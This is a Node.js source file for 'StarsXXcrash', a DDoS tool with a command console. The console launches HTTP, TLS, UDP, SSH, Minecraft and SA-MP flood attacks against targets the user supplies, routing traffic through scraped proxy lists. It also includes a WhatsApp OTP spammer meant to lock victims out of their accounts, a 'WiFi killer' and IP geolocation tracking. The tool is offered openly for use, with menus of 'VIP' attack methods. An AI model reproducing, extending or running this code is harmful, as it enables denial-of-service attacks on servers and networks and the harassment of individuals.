#!/usr/bin/env node

const { exec, spawn  } = require('child_process')
const readline = require('readline')
const url = require('url')
const fs = require('fs')
const axios = require('axios')
const path = require('path')
const version = '5.1.7'
let processList = [];

const permen = readline.createInterface({
  input: process.stdin,
  output: process.stdout
})
// [========================================] //
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
// [========================================] //
async function banner() {
console.clear()
console.log(`
          _______  
         /       /
___     /   ____/   
:   :  /   /:        
 :   :/___/  :        
  :       :   :        
   :_______:   :    StarsXXcrash ${version}
           /   /    Owner: KelvinzModz
          /   /     Premium: true
          :  /      WhatsApp: 6285763942406
           :/       Telegram: @kelvinadity
                    Portable Tools DDoS By KelvinzModz
                    Limit Users : 99999999999
                    Plans : High Vip
                    Svip : True
                    Colldown: 0
========================================================================`)}
// [========================================] //
async function scrapeProxy() {
  try {
    const response = await fetch('https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt');
    const data = await response.text();
    fs.writeFileSync('proxy.txt', data, 'utf-8');
  } catch (error) {
    console.error(`Error fetching data: ${error.message}`);
  }
}
// [========================================] //
async function scrapeUserAgent() {
  try {
    const response = await fetch('https://gist.githubusercontent.com/pzb/b4b6f57144aea7827ae4/raw/cf847b76a142955b1410c8bcef3aabe221a63db1/user-agents.txt');
    const data = await response.text();
    fs.writeFileSync('ua.txt', data, 'utf-8');
  } catch (error) {
    console.error(`Error fetching data: ${error.message}`);
  }
}
// [========================================] //
function clearProxy() {
  if (fs.existsSync('proxy.txt')) {
    fs.unlinkSync('proxy.txt');
  }
}
// [========================================] //
function clearUserAgent() {
  if (fs.existsSync('ua.txt')) {
    fs.unlinkSync('ua.txt');
  }
}
// [========================================] //
async function bootup() {
  try {
    console.log(`|| ▓░░░░░░░░░ || 10%`);
    await exec(`npm i axios tls http2 hpack net cluster crypto ssh2 dgram @whiskeysockets/baileys libphonenumber-js chalk gradient-string pino mineflayer proxy-agent`)
    console.log(`|| ▓▓░░░░░░░░ || 20%`);
    const getLatestVersion = await fetch('https://raw.githubusercontent.com/permenmd/cache/main/version.txt');
    const latestVersion = await getLatestVersion.text()
    console.log(`|| ▓▓▓░░░░░░░ || 30%`);
    if (version === latestVersion.trim()) {
    console.log(`|| ▓▓▓▓▓▓░░░░ || 60%`);
    
    const secretBangetJir = await fetch('https://raw.githubusercontent.com/permenmd/cache/main/sigma.txt');
    const password = await secretBangetJir.text();
    await console.log(`Login Key Required`)
    permen.question('[\x1b[1m\x1b[31mKelvinzModz Security\x1b[0m]: \n', async (skibidi) => {
      if (skibidi === password.trim()) {
        console.log(`Successfuly Logged`)
        await scrapeProxy()
        console.log(`|| ▓▓▓▓▓▓▓░░░ || 70%`)
        await scrapeUserAgent()
        console.log(`|| ▓▓▓▓▓▓▓▓▓▓ || 100%`)
        await sleep(700)
        console.clear()
        console.log(`Welcome To KelvinzModz Tools ${version}`)
        await sleep(1000)
		    await banner()
        console.log(`Type "help" For Showing All Available Command`)
        sigma()
      } else {
        console.log(`Wrong Key`)
        process.exit(-1);
      }
    }) 
  } else {
      console.log(`This Version Is Outdated. ${version} => ${latestVersion.trim()}`)
      console.log(`Waiting Auto Update...`)
      await exec(`npm uninstall -g prmnmd-tuls`)
      console.log(`Installing update`)
      await exec(`npm i -g prmnmd-tuls`)
      console.log(`Restart Tools Please`)
      process.exit()
    }
  } catch (error) {
    console.log(`Are You Online?`)
  }
}
// [========================================] //
async function killWifi() {
const wifiPath = path.join(__dirname, `/lib/cache/StarsXWiFi`);
const startKillwiFi = spawn('node', [wifiPath]);
console.log(`
WiFi Killer Has Started
Type exit To Stop
`);
permen.question('[\x1b[1m\x1b[31mKelvinzModz Wifi Killer\x1b[0m]: \n', async (yakin) => {
if (yakin === 'exit') {
  startKillwiFi.kill('SIGKILL')
  console.log(`WiFi Killer Has Ended`)
  sigma()
} else {
  console.log(`do you mean 'exit'?`)
  sigma()
}})
}
// [========================================] //
async function trackIP(args) {
  if (args.length < 1) {
    console.log(`Example: track-ip <ip address>
track-ip 1.1.1.1`);
    sigma();
	return
  }
const [target] = args
  if (target === '0.0.0.0') {
  console.log(`Jangan Di Ulangi Manis Nanti Di Delete User Mu`)
	sigma()
  } else {
    try {
const apiKey = '8fd0a436e74f44a7a3f94edcdd71c696';
const response = await fetch(`https://api.ipgeolocation.io/ipgeo?apiKey=${apiKey}&ip=${target}`);
const res = await fetch(`https://ipwho.is/${target}`);
const additionalInfo = await res.json();
const ipInfo = await response.json();

    console.clear()
    console.log(`
██████╗ ███████╗██████╗ ███╗   ███╗███████╗███╗   ██╗███╗   ███╗██████╗
██╔══██╗██╔════╝██╔══██╗████╗ ████║██╔════╝████╗  ██║████╗ ████║██╔══██╗
██████╔╝█████╗  ██████╔╝██╔████╔██║█████╗  ██╔██╗ ██║██╔████╔██║██║  ██║
██╔═══╝ ██╔══╝  ██╔══██╗██║╚██╔╝██║██╔══╝  ██║╚██╗██║██║╚██╔╝██║██║  ██║
██║     ███████╗██║  ██║██║ ╚═╝ ██║███████╗██║ ╚████║██║ ╚═╝ ██║██████╔╝
╚═╝     ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═══╝╚═╝     ╚═╝╚═════╝
                      Tracking IP Address Result 
========================================================================
 - Flags: ${ipInfo.country_flag}
 - Country: ${ipInfo.country_name}
 - Capital: ${ipInfo.country_capital}
 - City: ${ipInfo.city}
 - ISP: ${ipInfo.isp}
 - Organization: ${ipInfo.organization}
 - lat: ${ipInfo.latitude}
 - long: ${ipInfo.longitude}
      
 Google Maps: https://www.google.com/maps/place/${additionalInfo.latitude}+${additionalInfo.longitude}
`)
    sigma()
  } catch (error) {
      console.log(`Error Tracking ${target}`)
      sigma()
    }
    }
};
// [========================================] //
async function pushOngoing(target, methods, duration) {
  const startTime = Date.now();
  processList.push({ target, methods, startTime, duration })
  setTimeout(() => {
    const index = processList.findIndex((p) => p.methods === methods);
    if (index !== -1) {
      processList.splice(index, 1);
    }
  }, duration * 1000);
}
// [========================================] //
function ongoingAttack() {
  console.log("\nOngoing Attack:\n");
  
  // Print table header
  console.log(`    | HOST                                             | SINCE              | DURATION                  | METHOD`);
  console.log(`-------------------------------------------------------------------------------`);
  
  // Loop through the processList and print each process in table format
  processList.forEach((process, index) => {
    const since = Math.floor((Date.now() - process.startTime) / 1000);
    console.log(`${index + 1}    | ${process.target} | ${since}    | ${process.duration}       | ${process.methods}`);
  });

  console.log(`-------------------------------------------------------------------------------`);
}
// [========================================] //
async function handleAttackCommand(args) {
  if (args.length < 3) {
    console.log(`Example: attack <target> <duration> <methods>
attack https://google.com 120 flood`);
    sigma();
    return;
  }

  const [target, duration, methods] = args;
  try {
    const parsing = new URL(target); // url.URL -> URL (koreksi kecil)
    const hostname = parsing.hostname;
    const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`);
    const result = scrape.data;

    // Mendapatkan tanggal saat ini
    const now = new Date();
    const options = { month: 'short', day: 'numeric', year: 'numeric' };
    const formattedDate = now.toLocaleDateString('en-US', options);

    console.clear();
    console.log(`
 __           __         __         ______ ______               __ 
|  |--.-----.|  |.--.--.|__|.-----.|      |__    |.---.-.-----.|__|
|    <|  -__||  ||  |  ||  ||     ||   ---|    __||  _  |  _  ||  |
|__|__|_____||__| \\___/ |__||__|__||______|______||___._|   __||__|
                                                        |__|        

                      Attack Has Been Launched
==================================================================
Attack Details
[ Status Sent Successfully All Server ]
[ Target   : ${target} ]
[ Duration : ${duration} ]
[ Methods  : ${methods} ]
[ Sent On  : ${formattedDate} ]
Target Details
[ ISP      : ${result.isp} ]
[ IP       : ${result.query} ]
[ AS       : ${result.as} ]
`);
  } catch (error) {
    console.log(`Oops Something Went wrong`);
  }

  const metode = path.join(__dirname, `/lib/cache/${methods}`);
  if (methods === 'flood') {
    pushOngoing(target, methods, duration);
    exec(`node ${metode} ${target} ${duration}`);
    sigma();
  } else if (methods === 'tls') {
    pushOngoing(target, methods, duration);
    exec(`node ${metode} ${target} ${duration} 100 10`);
    sigma();
  } else if (methods === 'strike') {
    pushOngoing(target, methods, duration);
    exec(`node ${metode} GET ${target} ${duration} 10 90 proxy.txt --full`);
    sigma();
  } else if (methods === 'kill') {
    pushOngoing(target, methods, duration);
    exec(`node ${metode} ${target} ${duration} 100 10`);
    sigma();
  } else if (methods === 'bypass') {
    pushOngoing(target, methods, duration);
    exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`);
    sigma();
  } else if (methods === 'raw') {
    pushOngoing(target, methods, duration);
    exec(`node ${metode} ${target} ${duration}`);
    sigma();
  } else if (methods === 'thunder') {
    pushOngoing(target, methods, duration);
    exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`);
    sigma();
  } else if (methods === 'rape') {
    pushOngoing(target, methods, duration);
    exec(`node ${metode} ${duration} 10 proxy.txt 70 ${target}`);
    sigma();
  } else if (methods === 'storm') {
    pushOngoing(target, methods, duration);
    exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`);
    sigma();
  } else if (methods === 'destroy') {
    pushOngoing(target, methods, duration);
    exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`);
    sigma();
  } else if (methods === 'slim') {
    pushOngoing(target, methods, duration);
    const destroy = path.join(__dirname, `/lib/cache/destroy`);
    const storm = path.join(__dirname, `/lib/cache/storm`);
    const rape = path.join(__dirname, `/lib/cache/rape`);
    exec(`node ${destroy} ${target} ${duration} 100 1 proxy.txt`);
    exec(`node ${storm} ${target} ${duration} 100 1 proxy.txt`);
    exec(`node ${rape} ${duration} 1 proxy.txt 70 ${target}`);
    sigma();
  } else {
    console.log(`Method ${methods} not recognized.`);
  }
}
// [========================================] //
async function killSSH(args) {
  if (args.length < 2) {
    console.log(`Example: kill-ssh <target> <duration>
kill-ssh 123.456.789.10 120 flood`);
    sigma();
	return
  }
const [target, duration] = args
try {
const scrape = await axios.get(`http://ip-api.com/json/${target}?fields=isp,query,as`)
const result = scrape.data;

console.clear()
console.log(`
██████╗ ███████╗██████╗ ███╗   ███╗███████╗███╗   ██╗███╗   ███╗██████╗
██╔══██╗██╔════╝██╔══██╗████╗ ████║██╔════╝████╗  ██║████╗ ████║██╔══██╗
██████╔╝█████╗  ██████╔╝██╔████╔██║█████╗  ██╔██╗ ██║██╔████╔██║██║  ██║
██╔═══╝ ██╔══╝  ██╔══██╗██║╚██╔╝██║██╔══╝  ██║╚██╗██║██║╚██╔╝██║██║  ██║
██║     ███████╗██║  ██║██║ ╚═╝ ██║███████╗██║ ╚████║██║ ╚═╝ ██║██████╔╝
╚═╝     ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═══╝╚═╝     ╚═╝╚═════╝
                    SSH Killer Has Been Launched
========================================================================
Target   : ${target}
Duration : ${duration}
ISP      : ${result.isp}
Ip       : ${result.query}
AS       : ${result.as}
`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
}

const metode = path.join(__dirname, `/lib/cache/StarsXSSH`);
exec(`node ${metode} ${target} 22 root ${duration}`)
sigma()
};
// [========================================] //
async function killOTP(args) {
  if (args.length < 2) {
    console.log(`Example: kill-otp <target> <duration>
kill-otp 628xxx 120`);
    sigma();
	return
  }
const [target, duration] = args
try {
console.clear()
console.log(`
██████╗ ███████╗██████╗ ███╗   ███╗███████╗███╗   ██╗███╗   ███╗██████╗
██╔══██╗██╔════╝██╔══██╗████╗ ████║██╔════╝████╗  ██║████╗ ████║██╔══██╗
██████╔╝█████╗  ██████╔╝██╔████╔██║█████╗  ██╔██╗ ██║██╔████╔██║██║  ██║
██╔═══╝ ██╔══╝  ██╔══██╗██║╚██╔╝██║██╔══╝  ██║╚██╗██║██║╚██╔╝██║██║  ██║
██║     ███████╗██║  ██║██║ ╚═╝ ██║███████╗██║ ╚████║██║ ╚═╝ ██║██████╔╝
╚═╝     ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═══╝╚═╝     ╚═╝╚═════╝
                    OTP Killer Has Been Launched
========================================================================
Target   : ${target}
Duration : ${duration}

Spamming WhatsApp OTP That Can Annoy Someone Or Maybe Make Them Cannot Login`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
}

const metode = path.join(__dirname, `/lib/cache/StarsXTemp`);
exec(`node ${metode} +${target} ${duration}`)
sigma()
};
// [========================================] //
async function killDo(args) {
  if (args.length < 2) {
    console.log(`Example: kill-do <target> <duration>
kill-do 123.456.78.910 300`);
    sigma();
	return
  }
const [target, duration] = args
try {
console.clear()
console.log(`
██████╗ ███████╗██████╗ ███╗   ███╗███████╗███╗   ██╗███╗   ███╗██████╗
██╔══██╗██╔════╝██╔══██╗████╗ ████║██╔════╝████╗  ██║████╗ ████║██╔══██╗
██████╔╝█████╗  ██████╔╝██╔████╔██║█████╗  ██╔██╗ ██║██╔████╔██║██║  ██║
██╔═══╝ ██╔══╝  ██╔══██╗██║╚██╔╝██║██╔══╝  ██║╚██╗██║██║╚██╔╝██║██║  ██║
██║     ███████╗██║  ██║██║ ╚═╝ ██║███████╗██║ ╚████║██║ ╚═╝ ██║██████╔╝
╚═╝     ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═══╝╚═╝     ╚═╝╚═════╝
                    VPS Killer Has Been Launched
========================================================================
Target   : ${target}
Duration : ${duration}
Methods  : Digital Ocean Killer
Creator  : KelvinzModz`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
}
const raw = path.join(__dirname, `/lib/cache/raw`);
const flood = path.join(__dirname, `/lib/cache/flood`);
const ssh = path.join(__dirname, `/lib/cache/StarsXSSH`);
exec(`node ${ssh} ${target} 22 root ${duration}`)
exec(`node ${flood} https://${target} ${duration}`)
exec(`node ${raw} http://${target} ${duration}`)
sigma()
};
// [========================================] //
async function udp_flood(args) {
  if (args.length < 3) {
    console.log(`Example: udp-raw <target> <port> <duration>
udp-raw 123.456.78.910 53 300`);
    sigma();
	return
  }
const [target, port, duration] = args
try {
console.clear()
console.log(`
██████╗ ███████╗██████╗ ███╗   ███╗███████╗███╗   ██╗███╗   ███╗██████╗
██╔══██╗██╔════╝██╔══██╗████╗ ████║██╔════╝████╗  ██║████╗ ████║██╔══██╗
██████╔╝█████╗  ██████╔╝██╔████╔██║█████╗  ██╔██╗ ██║██╔████╔██║██║  ██║
██╔═══╝ ██╔══╝  ██╔══██╗██║╚██╔╝██║██╔══╝  ██║╚██╗██║██║╚██╔╝██║██║  ██║
██║     ███████╗██║  ██║██║ ╚═╝ ██║███████╗██║ ╚████║██║ ╚═╝ ██║██████╔╝
╚═╝     ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═══╝╚═╝     ╚═╝╚═════╝
                    UDP Raw Flood Attack Launched
========================================================================
Target   : ${target}
Duration : ${duration}
Methods  : UDP Raw
Creator  : KelvinzModz`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
}

const metode = path.join(__dirname, `/lib/cache/udp`);
exec(`node ${metode} ${target} ${port} ${duration}`)
sigma()
};
// [========================================] //
async function mcbot(args) {
  if (args.length < 3) {
    console.log(`Example: .mc-flood <target> <port> <duration>
mc-flood 123.456.78.910 25565 300`);
    sigma();
	return
  }
const [target, port, duration] = args
try {
console.clear()
console.log(`
██████╗ ███████╗██████╗ ███╗   ███╗███████╗███╗   ██╗███╗   ███╗██████╗
██╔══██╗██╔════╝██╔══██╗████╗ ████║██╔════╝████╗  ██║████╗ ████║██╔══██╗
██████╔╝█████╗  ██████╔╝██╔████╔██║█████╗  ██╔██╗ ██║██╔████╔██║██║  ██║
██╔═══╝ ██╔══╝  ██╔══██╗██║╚██╔╝██║██╔══╝  ██║╚██╗██║██║╚██╔╝██║██║  ██║
██║     ███████╗██║  ██║██║ ╚═╝ ██║███████╗██║ ╚████║██║ ╚═╝ ██║██████╔╝
╚═╝     ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═══╝╚═╝     ╚═╝╚═════╝
                   Minecraft Flood Attack Launched
========================================================================
Target   : ${target}
Duration : ${duration}
Methods  : Minecraft Flooder
Creator  : KelvinzModz`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
    sigma()
}

const metode = path.join(__dirname, `/lib/cache/StarsXMc`);
exec(`node ${metode} ${target} ${port} ${duration}`)
sigma()
};
// [========================================] //
async function samp(args) {
  if (args.length < 3) {
    console.log(`Example: .samp <target> <port> <duration>
samp 123.456.78.910 7777 300`);
    sigma();
	return
  }
const [target, port, duration] = args
try {
console.clear()
console.log(`
██████╗ ███████╗██████╗ ███╗   ███╗███████╗███╗   ██╗███╗   ███╗██████╗
██╔══██╗██╔════╝██╔══██╗████╗ ████║██╔════╝████╗  ██║████╗ ████║██╔══██╗
██████╔╝█████╗  ██████╔╝██╔████╔██║█████╗  ██╔██╗ ██║██╔████╔██║██║  ██║
██╔═══╝ ██╔══╝  ██╔══██╗██║╚██╔╝██║██╔══╝  ██║╚██╗██║██║╚██╔╝██║██║  ██║
██║     ███████╗██║  ██║██║ ╚═╝ ██║███████╗██║ ╚████║██║ ╚═╝ ██║██████╔╝
╚═╝     ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═══╝╚═╝     ╚═╝╚═════╝
                    SA MP Flood Attack Launched
========================================================================
Target   : ${target}
Duration : ${duration}
Methods  : SAMP Flooder
Creator  : KelvinzModz`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
    sigma()
}
const metode = path.join(__dirname, `/lib/cache/StarsXSamp`);
exec(`node ${metode} ${target} ${port} ${duration}`)
sigma()
};
// [========================================] //
async function subdomen(args) {
  if (args.length < 1) {
    console.log(`Example: .subdo-finder domain
.subdo-finder starsx.tech`);
    sigma();
	return
  }
const [domain] = args
try {
let response = await axios.get(`https://api.agatz.xyz/api/subdomain?url=${domain}`);
let hasilmanuk = response.data.data.map((data, index) => {
return `${data}`;
}).join('\n');
console.clear()
console.log(`
██████╗ ███████╗██████╗ ███╗   ███╗███████╗███╗   ██╗███╗   ███╗██████╗
██╔══██╗██╔════╝██╔══██╗████╗ ████║██╔════╝████╗  ██║████╗ ████║██╔══██╗
██████╔╝█████╗  ██████╔╝██╔████╔██║█████╗  ██╔██╗ ██║██╔████╔██║██║  ██║
██╔═══╝ ██╔══╝  ██╔══██╗██║╚██╔╝██║██╔══╝  ██║╚██╗██║██║╚██╔╝██║██║  ██║
██║     ███████╗██║  ██║██║ ╚═╝ ██║███████╗██║ ╚████║██║ ╚═╝ ██║██████╔╝
╚═╝     ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═══╝╚═╝     ╚═╝╚═════╝
                        Subdomains Finder
========================================================================
${hasilmanuk}`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
  sigma()
}
sigma()
};
// [========================================] //
async function chat_ai() {
permen.question('[\x1b[1m\x1b[31mKelvinzModz Chat AI\x1b[0m]: \n', async (yakin) => {
if (yakin === 'exit') {
  console.log(`Chat Ai Has Ended`)
  sigma()
} else {
  try {
let skidie = await axios.get(`https://api.agatz.xyz/api/ragbot?message=${yakin}`)
let kiddies = await skidie.data
console.log(`
[ Ragbot ]:
${kiddies.data}
`)
  } catch (error) {
      console.log(error)
  }
  chat_ai()
}})
}
// [========================================] //
async function sigma() {
const getNews = await fetch(`https://raw.githubusercontent.com/permenmd/cache/main/news.txt`)
const latestNews = await getNews.text();
const creatorCredits = `
Created And Coded Full By KelvinzModz

Thx To:
ChatGPT ( Fixing Error )
IrfanNotSepuh ( Gatau Ngapain )
Member And User ( Ga Buat Yang Dapet Gratis )
My Family
PLN Dan Wifi
Github
YouTube ( Music )
Allah SWT
`
permen.question('[\x1b[1m\x1b[32mKelvinzModz Console\x1b[0m]: \n', (input) => {
  const [command, ...args] = input.trim().split(/\s+/);

  if (command === 'help') {
    console.log(`
| methods      | show list of available methods
| track-ip     | track ip address with info
| subdo-finder | find all subdomain from domain
| attack       | launch ddos attack
| udp-raw      | launch udp flood attack
| kill-do      | digital ocean killer
| ongoing      | show ongoing attack
| botnet    | Api4api Sistem Attack all server
| news         | show latest KelvinzModz news
| ai           | Chat With Ai
| credits      | show creator of these tools
| clear        | clear terminal
`);
    sigma();
} else if (command === 'methods') {
  console.log(`
+============================================+
| NAME        | DESCRIPTION                  | DURATION |
+============================================+
| FLOOD      | LAYER 7 - Flooding [Basic]   | 500      |
| DESTROY     | LAYER 7 - Flooding Non Bypass| 7200     |
| TLS       | LAYER 7 - TLS [Basic]        | 100000   |
| STRIKE      | LAYER 7 - BypassV2 [VIP]     | 500000   |
| SLIM      | LAYER 7 - Oh Is Fit There [VIP]     | 500000   |
| STROM      | LAYER 7 - Dobble Power [VIP]     | 500000   |
| BYPASS      | LAYER 7 - Bypass [VIP]       | 500      |
| THUNDER     | LAYER 7 - Special Methods [VIP]| 500    |
| KILL        | LAYER 7 - Special Methods [VIP]| 500    |
| RAW         | LAYER 7 - Raw Non Bypass [Basic]| 500   |
| RAPE       | LAYER 7 - Http 1 Only [VIP]  | 500      |
| KILL-SSH    | LAYER 4 - Killing SSH Access [VIP]| 300 |
| KILL-DO    | LAYER 4 - Killing Digital Ocean Access [VIP]| 600 |
| MC-FLOOD    | LAYER 4 - EXTRA KILL MINECRAFT [VIP]| 100 |
| UDP-Raw    | LAYER 4 - Udp Flooding [VIP]| 100 |
| KILL-PING    | LAYER 4 - sending death pingers [VIP]| 1100 |
| KILL-Wifi    | LAYER 4 - kill your wifi (termux/linux/windows only) [VIP]| Nonstop |
| KILL-OTP    | LAYER 0 - kill WhatsApp OTP Verification [VIP]| 99999 |
+============================================+
`);
    sigma();
  } else if (command === 'news') {
    console.log(`
${latestNews}`);
    sigma();
  } else if (command === 'credits') {
    console.log(`
${creatorCredits}`);
    sigma();
  } else if (command === 'attack') {
    handleAttackCommand(args);
  } else if (command === 'kill-ssh') {
    killSSH(args);
  } else if (command === 'kill-otp') {
    killOTP(args);
  } else if (command === 'udp-raw') {
    udp_flood(args);
  } else if (command === 'kill-do') {
    killDo(args);
  } else if (command === 'ongoing') {
    ongoingAttack()
    sigma()
  } else if (command === 'track-ip') {
    trackIP(args);
  } else if (command === 'ai') {
    console.log(`KelvinzModz Ai Ragbot Started
Type "exit" To Stop Chat`);
    chat_ai()
  } else if (command === 'mc-flood') {
    mcbot(args)
  } else if (command === 'kill-ping') {
    pod(args)
  } else if (command === 'samp') {
    samp(args)
  } else if (command === 'subdo-finder') {
    subdomen(args)
  } else if (command === 'kill-wifi') {
    killWifi()
  } else if (command === 'clear') {
    banner()
    sigma()
    } else {
    console.log(`${command} Not Found`);
    sigma();
  }
});
}
// [========================================] //
function clearall() {
  clearProxy()
  clearUserAgent()
}
// [========================================] //
process.on('exit', clearall);
process.on('SIGINT', () => {
  clearall()
  process.exit();
});
process.on('SIGTERM', () => {
clearall()
 process.exit();
});

bootup()